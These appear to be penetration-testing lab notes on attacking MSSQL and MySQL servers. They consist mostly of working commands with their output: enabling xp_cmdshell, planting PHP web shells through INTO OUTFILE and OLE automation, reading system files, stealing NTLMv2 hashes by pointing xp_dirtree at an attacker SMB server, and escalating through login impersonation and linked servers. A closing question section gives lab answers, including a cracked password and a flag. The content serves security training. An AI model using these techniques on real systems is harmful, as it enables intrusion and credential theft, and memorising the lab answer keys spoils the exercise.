# Attacking SQL Databases
## Enumeration
By default, **MSSQL** uses ports `TCP/1433` and UDP/1434, and **MySQL** uses `TCP/3306`. However, when **MSSQL** operates in a "hidden" mode, it uses the `TCP/2433` port. We can use Nmap's default scripts `-sC` option to enumerate database services on a target system:

```sh
$ nmap -Pn -sV -sC -p1433 10.10.10.125
```

## Authentication Mechanisms
**MSSQL** supports two authentication modes, which means that users can be created in Windows or the SQL Server:

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Authentication Type</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Windows authentication mode</code></td>
<td>This is the default, often referred to as <code>integrated</code> security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials.</td>
</tr>
<tr>
<td><code>Mixed mode</code></td>
<td>Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.</td>
</tr>
</tbody>
</table>

**MySQL** also supports different authentication methods, such as username and password, as well as Windows authentication (a plugin is required). In addition, administrators can choose an authentication mode for many reasons, including compatibility, security, usability, and more.

## Protocol Specific Attacks
### Read/Change the Database
```sh
# MySQL
$ mysql -u julio -pPassword123 -h 10.129.20.13

# MSSQL from Windows
# If we use sqlcmd, we will need to use GO after our query to execute the SQL syntax.
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

# MSSQL from Linux
$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

# or use the tool from Impacket
$ mssqlclient.py -p 1433 julio@10.129.203.7 -windows-auth
```

When using Windows Authentication, we need to specify the domain name or the hostname of the target machine. If we don't specify a domain or hostname, it will assume SQL Authentication and authenticate against the users created in the SQL Server. Instead, if we define the domain or hostname, it will use Windows Authentication. If we are targetting a local account, we can use `SERVERNAME\\accountname` or `.\\accountname`. The full command would look like:

```sh
$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h
```

### SQL Default Databases
**MySQL** default system schemas/databases:
- `mysql` - is the system database that contains tables that store information required by the MySQL server
- `information_schema` - provides access to database metadata
- `performance_schema` - is a feature for monitoring MySQL Server execution at a low level
- `sys` - a set of objects that helps DBAs and developers interpret data collected by the Performance Schema

**MSSQL** default system schemas/databases:
- `master` - keeps the information for an instance of SQL Server.
- `msdb` - used by SQL Server Agent.
- `model` - a template database copied for each new database.
- `resource` - a read-only database that keeps system objects visible in every database on the server in sys schema.
- `tempdb` - keeps temporary objects for SQL queries.

### Execute Commands
**MSSQL** has a extended stored procedures called `xp_cmdshell` which allow us to execute system commands using SQL. Keep in mind the following about `xp_cmdshell`:
- `xp_cmdshell` is a powerful feature and disabled by default. `xp_cmdshell` can be enabled and disabled by using the [Policy-Based Management](https://docs.microsoft.com/en-us/sql/relational-databases/security/surface-area-configuration) or by executing `sp_configure`
- The Windows process spawned by `xp_cmdshell` has the same security rights as the SQL Server service account
- `xp_cmdshell` operates synchronously. Control is not returned to the caller until the command-shell command is completed

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```mssql
-- To allow advanced options to be changed.  
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.  
RECONFIGURE
GO  

-- To enable the feature.  
EXECUTE sp_configure 'xp_cmdshell', 1
GO  

-- To update the currently configured value for this feature.  
RECONFIGURE
GO
```

There are other methods to get command execution, such as adding [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), and [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql). However, besides those methods there are also additional functionalities that can be used like the `xp_regwrite` command that is used to elevate privileges by creating new entries in the Windows registry.

**MySQL** supports [User Defined Functions](https://dotnettutorials.net/lesson/user-defined-functions-in-mysql/) which allows us to execute C/C++ code as a function within SQL, there's one User Defined Function for command execution in this [GitHub repository](https://github.com/mysqludf/lib_mysqludf_sys). It is not common to encounter a user-defined function like this in a production environment, but we should be aware that we may be able to use it.

### Write Local Files
**MySQL** does not have a stored procedure like `xp_cmdshell`, but we can achieve command execution if we write to a location in the file system that can execute our commands. 

```mysql
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```

In **MySQL**, a global system variable `secure_file_priv` limits the effect of data import and export operations, such as those performed by the `LOAD DATA` and `SELECT … INTO OUTFILE` statements and the `LOAD_FILE()` function. These operations are permitted only to users who have the `FILE` privilege.

`secure_file_priv` may be set as follows:
- If empty, the variable has no effect, which is not a secure setting.
- If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server does not create it.
- If set to NULL, the server disables import and export operations.

```mysql
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```

To write files using **MSSQL**, we need to enable `Ole Automation Procedures`, which requires admin privileges, and then execute some stored procedures to create the file:

```mssql
# MSSQL - Enable Ole Automation Procedures
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO

# MSSQL - Create a File
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```

### Read Local Files
By default, **MSSQL** allows file read on any file in the operating system to which the account has read access. We can use the following SQL query:

```mssql
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

As we previously mentioned, by default a **MySQL** installation does not allow arbitrary file read, but if the correct settings are in place and with the appropriate privileges, we can read files using the following methods:

```mysql
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

### Capture MSSQL Service Hash
In the Attacking SMB section, we discussed that we could create a fake SMB server to steal a hash and abuse some default implementation within a Windows operating system. We can also steal the MSSQL service account hash using `xp_subdirs` or `xp_dirtree` undocumented stored procedures, which use the SMB protocol to retrieve a list of child directories under a specified parent directory from the file system. When we use one of these stored procedures and point it to our SMB server, the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.

To make this work, we need first to start Responder or impacket-smbserver and execute one of the following SQL queries:

```mssql
# XP_DIRTREE Hash Stealing
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------

# XP_SUBDIRS Hash Stealing
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

If the service account has access to our server, we will obtain its hash. We can then attempt to crack the hash or relay it to another host.

```sh
# XP_SUBDIRS Hash Stealing with Responder
$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F0058003200040034005700490

# XP_SUBDIRS Hash Stealing with impacket
$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:0101000000000000009BFFB9DE3DD801D5448EF4D0BA034D0000000002000800510053004700320001001E00570049004E002D003500440050005A0033005200530032004F0058003200040034005700490
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

### Impersonate Existing Users with MSSQL
SQL Server has a special permission, named `IMPERSONATE`, that allows the executing user to take on the permissions of another user or login until the context is reset or the session ends. Let's explore how the `IMPERSONATE` privilege can lead to privilege escalation in SQL Server.

Identify Users that We Can Impersonate

```mssql
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```

Verifying our Current User and Role

```mssql
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

As the returned value `0` indicates, we do not have the `sysadmin` role, but we can impersonate the `sa` user. 

Impersonating the SA User

```mssql
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```

> **Note:** It's recommended to run EXECUTE AS LOGIN within the master DB, because all users, by default, have access to that database. If a user you are trying to impersonate doesn't have access to the DB you are connecting to it will present an error. Try to move to the master DB using USE master.

We can now execute any command as a `sysadmin` as the returned value `1` indicates. To revert the operation and return to our previous user, we can use the Transact-SQL statement `REVERT`.

### Communicate with Other Databases with MSSQL
MSSQL has a configuration option called [linked servers](https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/create-linked-servers-sql-server-database-engine). Linked servers are typically configured to enable the database engine to execute a Transact-SQL statement that includes tables in another instance of SQL Server, or another database product such as Oracle.

Identify linked Servers in MSSQL

```mssql
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

As we can see in the query's output, we have the name of the server and the column `isremote`, where `1` means is a remote server, and `0` is a linked server. We can see [sysservers Transact-SQL](https://docs.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysservers-transact-sql) for more information.

Next, we can attempt to identify the user used for the connection and its privileges. The `EXECUTE` statement can be used to send pass-through commands to linked servers. 

```mssql
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```

As we have seen, we can now execute queries with `sysadmin` privileges on the linked server. As `sysadmin`, we control the SQL Server instance. We can read data from any database or execute system commands with `xp_cmdshell`.

## Questions
1. What is the password for the "mssqlsvc" user? **Answer: princess1**
   - Use the Capture MSSQL Service Hash attack:
     - `$ sudo responder -I tun0` → Start a fake SMB Server to capture the users' NetNTLM v2 hashes
     - `$ sqlcmd -S 10.129.32.70 -U htbdbuser -P 'MSSQLAccess01!' -y 30 -Y 30` → Login to the MSSQL Server using the provided credential `htbdbuser:MSSQLAccess01!`
     - `1> EXEC master..xp_dirtree '\\10.10.15.253\share\'` and `2> go` → Use `xp_dirtree` undocumented stored procedures to retrieve a list of child directories under a specified parent directory from the file system. When we use this stored procedures and point it to our SMB server (10.10.15.253), the directory listening functionality will force the server to authenticate and send the NTLMv2 hash of the service account that is running the SQL Server.
     - Capture the NTLMv2 hash at Responder:
      ```sh
      $ sudo responder -I tun0
      <SNIP>
      [SMB] NTLMv2-SSP Client   : 10.129.32.70
      [SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
      [SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:985b07b349926e8b:5F202098776A056F0A80DED3F8D2F9F6:0101000000000000808A05797299DC017F039AABFCE1AA1B0000000002000800590042003100310001001E00570049004E002D0050004B0035004A0056005700440059004E003200580004003400570049004E002D0050004B0035004A0056005700440059004E00320058002E0059004200310031002E004C004F00430041004C000300140059004200310031002E004C004F00430041004C000500140059004200310031002E004C004F00430041004C0007000800808A05797299DC01060004000200000008003000300000000000000000000000003000003AAA34C1E308325C5BBF6AD2154CC331D2C004BCF4CCD283C1AF9DFB73BAFD5C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003200350033000000000000000000
      <SNIP>
      ```
      - Write the hash `mssqlsvc::WIN-02:...:...0000` to `hash.txt` and crack it offline using: `$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
2. Enumerate the "flagDB" database and submit a flag as your answer. **Answer: HTB{!\_l0v3\_#4\$#!n9\_4nd\_r3$p0nd3r}**
   - `sqlcmd -S 10.129.32.70 -U WIN-02\mssqlsvc -P princess1 -y 30 -Y 30` → Login to the MSSQL Server with the found credential `WIN-02\mssqlsvc:princess1`
   - Enumerate the flagDB database and retrieve the flag:
      ```mssql
      1> SELECT name FROM master.dbo.sysdatabases
      2> go
      name                          
      ------------------------------
      master                        
      tempdb                        
      model                         
      msdb                          
      hmaildb                       
      flagDB                        

      (6 rows affected)
      1> select table_name from flagDB.INFORMATION_SCHEMA.TABLES
      2> go
      table_name                    
      ------------------------------
      tb_flag                       

      (1 row affected)
      1> use flagDB
      2> go
      Changed database context to 'flagDB'.
      1> select * from tb_flag
      2> go
      flagvalue                     
      ------------------------------
      HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd

      (1 row affected)
      ```